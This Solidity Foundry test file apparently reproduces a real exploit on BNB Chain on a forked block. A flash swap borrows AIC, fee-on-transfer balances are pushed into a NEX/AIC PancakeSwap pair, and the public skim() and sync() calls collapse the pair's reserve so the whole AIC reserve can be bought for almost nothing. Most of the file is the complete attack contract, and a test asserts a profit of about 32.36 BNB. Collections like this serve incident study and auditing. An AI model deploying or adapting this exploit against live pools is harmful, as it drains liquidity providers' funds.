// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// AIC — PancakeSwap-pair skim / reserve-mismatch drain, flash-swap leveraged, on BNB Chain.
// ~32.36 BNB (~$21.5K) netted by the attacker EOA in a single tx.
//
// Exploit tx : 0x905cc861bcc525d3a8e699583943831b97500bbac11c92dc20ed6edbddd69f87 (block 113782392)
// Attacker   : 0xC3cB0872C42BFA5EB3B0258D7EEA2cCaF6a49475
// AIC (FoT)  : 0xc0DC449De632586A00409873521AFC251aC5cE74 (victim, fee-on-transfer token)
// NEX        : 0xaE04AE29bdB7aB7Eb249d3aFa7Bc3D37564e8Cf9 (also fee-on-transfer)
// USDC/AIC   : 0xe89636FB73D04Db51e5Fbd0Ce1379fb8d2b96415 (flash-swap source; AIC = token1)
// NEX/AIC    : 0x974C0078740480aE830D379fDB8d5f441C9dDC75 (skim victim; NEX = token0, AIC = token1)
//
// Root cause (reproducible contract mechanism, NOT a key/signer/admin compromise; the token/pair
// sources are unverified on BscScan, so the vulnerability is described from the observed on-chain
// behaviour): AIC and NEX are fee-on-transfer tokens, and a Uniswap-V2-style pair's skim() is a
// PUBLIC function that pays any caller the difference between a token's real balance and the
// pair's recorded reserve. By swapping a flash-borrowed pile of AIC into the NEX/AIC pair, then
// transferring most of the NEX received back into that pair and calling the public skim() + sync()
// on it, the attacker collapses the pair's NEX reserve to ~1 while its AIC reserve stays at the
// full ~83.26M. A tiny retained NEX amount then buys essentially the entire AIC reserve at the
// wrecked ratio. Every step (flash swap, router swaps, skim, sync) is a permissionless public call.
//
// Exact sequence, reconstructed 1:1 from the on-chain trace as ordinary typed calls (no bytecode
// blob, no raw calldata replay, no redeploy of the original attack contract):
//   1. flash-swap ~42.98M AIC (the pair's whole AIC balance, minus 1 wei) out of the USDC/AIC pair.
//   In the pancakeCall callback:
//     2. swap all the borrowed AIC -> NEX through the NEX/AIC pair (AIC piles into that pair).
//     3. transfer ~33.77M of the received NEX back into the NEX/AIC pair, keep a ~19.35k-NEX sliver.
//     4. skim() the pair (surplus paid to the router address) and sync() it -> NEX reserve ~1,
//        AIC reserve ~83.26M.
//     5. swap the retained NEX -> ~83.26M AIC at the wrecked ratio.
//     6. repay the flash swap: ~43.09M AIC (borrow + ~0.26% pancake fee) to the USDC/AIC pair.
//   7. dump the remaining ~40.17M AIC -> USDC -> WBNB and forward the ~32.36 BNB to the attacker.
//   (A ~2M-NEX residue ends at a helper 0x0f7e35653f6A8E09A0865a183B51177e16237CB5 in the original
//    incident; it is not part of the EOA's BNB gain and is out of scope for the assertion below.)
//
// forge test --contracts src/test/2026-08/AIC_exp.sol -vvv

interface IPancakePair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
    function skim(
        address to
    ) external;
    function sync() external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract AICAttack {
    IPancakeRouter internal constant ROUTER = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address internal constant USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant AIC = 0xc0DC449De632586A00409873521AFC251aC5cE74;
    address internal constant NEX = 0xaE04AE29bdB7aB7Eb249d3aFa7Bc3D37564e8Cf9;
    IPancakePair internal constant NA = IPancakePair(0x974C0078740480aE830D379fDB8d5f441C9dDC75); // NEX/AIC
    IPancakePair internal constant UA = IPancakePair(0xe89636FB73D04Db51e5Fbd0Ce1379fb8d2b96415); // USDC/AIC, AIC=token1

    // NEX amount transferred back into the NEX/AIC pair before the skim (observed on-chain); the
    // sliver kept is what then buys out the whole AIC reserve.
    uint256 internal constant NEX_INTO_PAIR = 33_765_346_758_312_339_612_076_744;

    address internal immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function attack() external {
        // Flash-swap the USDC/AIC pair's entire AIC balance (token1), minus 1 wei.
        uint256 flashAmt = IERC20(AIC).balanceOf(address(UA)) - 1;
        UA.sync();
        UA.swap(0, flashAmt, address(this), abi.encode(flashAmt));

        // Dump the leftover AIC to BNB and forward it to the attacker EOA.
        IERC20(AIC).approve(address(ROUTER), type(uint256).max);
        address[] memory path = new address[](3);
        path[0] = AIC;
        path[1] = USDC;
        path[2] = WBNB;
        ROUTER.swapExactTokensForETHSupportingFeeOnTransferTokens(
            IERC20(AIC).balanceOf(address(this)), 0, path, owner, block.timestamp
        );
    }

    function pancakeCall(
        address,
        uint256,
        uint256 amount1,
        bytes calldata
    ) external {
        require(msg.sender == address(UA), "not pair");
        uint256 borrowed = amount1;

        IERC20(AIC).approve(address(ROUTER), type(uint256).max);
        IERC20(NEX).approve(address(ROUTER), type(uint256).max);

        // 2. AIC -> NEX through the NEX/AIC pair (piles the borrowed AIC into that pair).
        address[] memory p1 = new address[](2);
        p1[0] = AIC;
        p1[1] = NEX;
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(borrowed, 0, p1, address(this), block.timestamp);

        // 3-4. Transfer most NEX back into the pair, skim the surplus out, and sync so the pair's
        //      NEX reserve collapses to ~1 while its AIC reserve stays at ~83.26M.
        IERC20(NEX).transfer(address(NA), NEX_INTO_PAIR);
        NA.skim(address(ROUTER));
        NA.sync();

        // 5. Buy out the whole AIC reserve with the retained NEX sliver.
        address[] memory p2 = new address[](2);
        p2[0] = NEX;
        p2[1] = AIC;
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(NEX).balanceOf(address(this)), 0, p2, address(this), block.timestamp
        );

        // 6. Repay the flash swap (borrow + ~0.26% fee).
        IERC20(AIC).transfer(msg.sender, (borrowed * 10_026) / 10_000);
    }

    receive() external payable {}
}

contract AICExp is BaseTestWithBalanceLog {
    address internal constant ATTACKER = 0xC3cB0872C42BFA5EB3B0258D7EEA2cCaF6a49475;
    uint256 internal constant FORK_BLOCK = 113_782_391; // parent of the exploit block 113782392

    function setUp() public {
        vm.createSelectFork("bsc", FORK_BLOCK);
        vm.label(ATTACKER, "AttackerEOA");
        vm.label(0x974C0078740480aE830D379fDB8d5f441C9dDC75, "NEX_AIC_pair");
        vm.label(0xe89636FB73D04Db51e5Fbd0Ce1379fb8d2b96415, "USDC_AIC_pair");
    }

    /// forge-config: default.evm_version = "cancun"
    function testExploit() public {
        uint256 before = ATTACKER.balance;

        vm.prank(ATTACKER, ATTACKER);
        AICAttack exploit = new AICAttack();
        exploit.attack();

        uint256 gain = ATTACKER.balance - before;
        emit log_named_decimal_uint("attacker BNB gain", gain, 18);

        // Reproduced gain matches the reported ~32.36 BNB.
        assertApproxEqAbs(gain, 32.36e18, 0.1e18, "BNB gain off expected ~32.36");
    }
}
